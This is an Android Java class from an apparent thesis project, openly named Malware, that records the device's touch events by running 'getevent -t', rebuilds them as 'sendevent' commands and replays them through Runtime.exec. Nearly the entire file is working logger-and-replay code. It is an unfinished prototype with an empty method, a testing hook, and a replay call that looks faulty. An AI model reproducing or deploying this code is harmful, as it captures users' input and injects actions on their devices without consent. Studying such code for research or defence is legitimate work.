package com.example.thesis;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable{
    private Queue<String[]> commands = new LinkedList<>();
    private Process getEventProcess;

    @Override
    public void run() {
        captureKeyPresses();
    }


    /**
     * Captures touch events and saves them as commands into the commands queue.
     */
    private void captureKeyPresses() {
        try {
            getEventProcess = Runtime.getRuntime().exec("getevent -t");

            InputStreamReader inputStreamReader = new InputStreamReader(getEventProcess.getInputStream());
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

            List<String> touchEvent = new ArrayList<>();

            // Reading incoming events.
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                String[] event = line.split("]");
                event = event[1].split("\\s+");

                // Building the new command.
                StringBuilder sb = new StringBuilder();
                sb.append("sendevent").append(" ");
                sb.append(event[1].substring(0, event[1].length() - 1)).append(" ");
                sb.append(Integer.parseInt(event[2], 16)).append(" ");
                sb.append(Integer.parseInt(event[3], 16)).append(" ");
                sb.append(Integer.parseInt(event[4], 16));

                // ...
                String command = sb.toString();
                touchEvent.add(command);

                if (event[3].equals("0000") && event[4].equals("00000000")) {
                    // This means that this is the end of the current event.
                    String[] touchEventArray = new String[touchEvent.size()];
                    touchEventArray = touchEvent.toArray(touchEventArray);
                    this.commands.add(touchEventArray);
                    touchEvent.clear();
                    Log.i("Malware", "Captured touch event!");
                    forTesting();  //TODO: remove later!
                }
            }
        } catch (IOException error) {
            Log.e("Malware getevent", error.getMessage());
        }
    }


    /**
     * Turns off getEventProcess and resends all captured events.
     */
    private void sendKeyPresses() {
        // If I would leave it running it would recapture these events.
        getEventProcess.destroy();

        // Sending collected events.
        while(!commands.isEmpty()) {
            String[] touchEvent = commands.poll();
            try {
                Runtime.getRuntime().exec(touchEvent);
            } catch (IOException error) {
                Log.e("Malware sendevent", error.getMessage());
            }
        }
    }


    private void getTouchCoordinates() {

    }


    private void forTesting() {
        // TODO: remove later, is for testing basic functionality.
        if (commands.size() >= 3) {
            sendKeyPresses();
        }
    }
}
